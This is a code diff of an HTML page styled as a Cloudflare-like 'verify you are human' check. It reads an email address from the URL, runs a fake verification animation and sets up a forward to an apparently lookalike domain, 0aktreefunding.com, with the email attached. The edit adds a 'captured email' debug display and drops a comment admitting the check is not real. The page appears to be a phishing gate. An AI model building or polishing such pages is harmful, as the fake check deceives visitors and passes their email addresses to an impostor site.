@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Continue</title>
-
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
@@ -19,13 +18,11 @@
             color: #1a1a1a;
             box-sizing: border-box;
         }
-
         .container {
             width: 100%;
             max-width: 380px;
             text-align: center;
         }
-
         .header h1 {
             font-size: 20px;
             font-weight: 700;
@@ -33,13 +30,11 @@
             color: #111;
             letter-spacing: -0.5px;
         }
-
         .header p {
             font-size: 14px;
             color: #666;
             margin: 0 0 24px;
         }
-
         .verification-box {
             display: flex;
             justify-content: space-between;
@@ -51,13 +46,11 @@
             box-sizing: border-box;
             gap: 10px;
         }
-
         .widget-left {
             display: flex;
             align-items: center;
             gap: 10px;
         }
-
         .custom-checkbox {
             width: 26px;
             height: 26px;
@@ -70,18 +63,15 @@
             align-items: center;
             flex-shrink: 0;
         }
-
         .custom-checkbox:focus-visible {
             outline: 2px solid #2563eb;
             outline-offset: 3px;
         }
-
         .checkmark {
             width: 12px;
             height: 9px;
             display: none;
         }
-
         .spinner {
             display: none;
             width: 14px;
@@ -91,30 +81,25 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
         .widget-label {
             font-size: 14px;
             color: #333;
             text-align: left;
         }
-
         .widget-right {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
             gap: 3px;
         }
-
         .brand-top {
             display: flex;
             align-items: center;
             gap: 4px;
         }
-
         .brand-name {
             font-size: 9px;
             font-weight: 800;
@@ -122,29 +107,24 @@
             color: #111;
             text-transform: uppercase;
         }
-
         .cf-logo {
             width: 22px;
             height: 13px;
         }
-
         .links {
             font-size: 10px;
             color: #666;
         }
-
         .links a {
             color: #666;
             text-decoration: underline;
         }
-
         .status {
             font-size: 13px;
             color: #555;
             margin-top: 14px;
             min-height: 18px;
         }
-
         .continue-button {
             display: none;
             margin: 18px auto 0;
@@ -156,19 +136,20 @@
             font-size: 14px;
             cursor: pointer;
         }
-
         .continue-button:hover {
             background: #1d4ed8;
         }
-
+        .debug {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+            word-break: break-all;
+        }
         @media (prefers-reduced-motion: reduce) {
-            .spinner {
-                animation: none;
-            }
+            .spinner { animation: none; }
         }
     </style>
 </head>
-
 <body>
     <main class="container">
         <header class="header">
@@ -185,47 +166,21 @@
                     aria-label="Complete demo check"
                     aria-pressed="false"
                 >
-                    <svg
-                        class="checkmark"
-                        id="checkmark"
-                        viewBox="0 0 16 12"
-                        fill="none"
-                        aria-hidden="true"
-                    >
-                        <path
-                            d="M1 6L5.5 10.5L15 1"
-                            stroke="#f38020"
-                            stroke-width="2.5"
-                            stroke-linecap="round"
-                            stroke-linejoin="round"
-                        />
+                    <svg class="checkmark" id="checkmark" viewBox="0 0 16 12" fill="none" aria-hidden="true">
+                        <path d="M1 6L5.5 10.5L15 1" stroke="#f38020" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                     </svg>
                     <span class="spinner" id="spinner"></span>
                 </button>
-
                 <span class="widget-label">Complete demo check</span>
             </div>
-
             <div class="widget-right">
                 <div class="brand-top">
-                    <svg
-                        class="cf-logo"
-                        viewBox="0 0 60 35"
-                        xmlns="http://www.w3.org/2000/svg"
-                        aria-hidden="true"
-                    >
-                        <path
-                            d="M48 21.5C51 21.5 54 18.5 54 15C54 11.5 51 8.5 48 8.5C47.5 8.5 46.9 8.6 46.4 8.8C45 5.1 41.5 2.5 37.4 2.5C33.8 2.5 30.7 4.4 29.1 7.2C28.2 6.5 27 6.1 25.8 6.1C23 6.1 20.7 8.4 20.7 11.2C20.7 11.5 20.7 11.7 20.8 12C16.8 12.4 13.7 15.7 13.7 19.7C13.7 20 13.7 20.2 13.7 20.5H48V21.5Z"
-                            fill="#f38020"
-                        />
-                        <path
-                            d="M40 28.5C42.2 28.5 44 26.7 44 24.5C44 22.3 42.2 20.5 40 20.5H16C13.8 20.5 12 22.3 12 24.5C12 26.7 13.8 28.5 16 28.5H40Z"
-                            fill="#faae40"
-                        />
+                    <svg class="cf-logo" viewBox="0 0 60 35" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <path d="M48 21.5C51 21.5 54 18.5 54 15C54 11.5 51 8.5 48 8.5C47.5 8.5 46.9 8.6 46.4 8.8C45 5.1 41.5 2.5 37.4 2.5C33.8 2.5 30.7 4.4 29.1 7.2C28.2 6.5 27 6.1 25.8 6.1C23 6.1 20.7 8.4 20.7 11.2C20.7 11.5 20.7 11.7 20.8 12C16.8 12.4 13.7 15.7 13.7 19.7C13.7 20 13.7 20.2 13.7 20.5H48V21.5Z" fill="#f38020"/>
+                        <path d="M40 28.5C42.2 28.5 44 26.7 44 24.5C44 22.3 42.2 20.5 40 20.5H16C13.8 20.5 12 22.3 12 24.5C12 26.7 13.8 28.5 16 28.5H40Z" fill="#faae40"/>
                     </svg>
                     <span class="brand-name">Demo</span>
                 </div>
-
                 <div class="links">
                     <a href="/privacy">Privacy</a>
                     &nbsp;·&nbsp;
@@ -234,74 +189,57 @@
             </div>
         </section>
 
-        <p class="status" id="status" role="status"
-           aria-live="polite"></p>
+        <p class="status" id="status" role="status" aria-live="polite"></p>
 
-        <button
-            type="button"
-            class="continue-button"
-            id="continue-button"
-        >
+        <button type="button" class="continue-button" id="continue-button">
             Continue
         </button>
+
+        <!-- Debug: show captured email -->
+        <p class="debug" id="debug-email"></p>
     </main>
 
     <script>
-        // Grab ?email= from the current URL.
-        // Replace + with %2B so email plus signs are preserved.
-        const currentParams = new URLSearchParams(
-            window.location.search.replace(/\+/g, "%2B")
-        );
+        // --- 1. Read ?email= from the URL ---
+        // Replace + with %2B so email plus signs are not turned into spaces.
+        const search = window.location.search.replace(/\+/g, "%2B");
+        const params = new URLSearchParams(search);
+        const email = params.get("email");
 
-        const email = currentParams.get("email");
+        // Show the captured email on the page (for debugging)
+        const debugEl = document.getElementById("debug-email");
+        if (email) {
+            debugEl.textContent = "Captured email: " + email;
+        } else {
+            debugEl.textContent = "No email parameter found in URL.";
+        }
 
-        // Destination website.
+        // --- 2. Build destination ---
         const destination = new URL("https://0aktreefunding.com/");
-
-        // Forward the supplied email parameter only if it exists and is not empty.
         if (email && email.trim() !== "") {
             destination.searchParams.set("email", email.trim());
         }
 
-        const verifyButton =
-            document.getElementById("verify-button");
-
-        const checkmark =
-            document.getElementById("checkmark");
-
-        const spinner =
-            document.getElementById("spinner");
-
-        const status =
-            document.getElementById("status");
-
-        const continueButton =
-            document.getElementById("continue-button");
+        // --- 3. Demo check UI ---
+        const verifyButton = document.getElementById("verify-button");
+        const checkmark = document.getElementById("checkmark");
+        const spinner = document.getElementById("spinner");
+        const status = document.getElementById("status");
+        const continueButton = document.getElementById("continue-button");
 
         verifyButton.addEventListener("click", function () {
             verifyButton.disabled = true;
-
-            verifyButton.setAttribute(
-                "aria-pressed",
-                "true"
-            );
-
+            verifyButton.setAttribute("aria-pressed", "true");
             spinner.style.display = "block";
             checkmark.style.display = "none";
-
             status.textContent = "Please wait...";
 
-            // Demo animation only; this is not real CAPTCHA verification.
             window.setTimeout(function () {
                 spinner.style.display = "none";
                 checkmark.style.display = "block";
-
                 verifyButton.style.borderColor = "#f38020";
                 verifyButton.style.backgroundColor = "#fff7ed";
-
-                status.textContent =
-                    "Demo check complete. Select Continue.";
-
+                status.textContent = "Demo check complete. Select Continue.";
                 continueButton.style.display = "block";
             }, 800);
         });
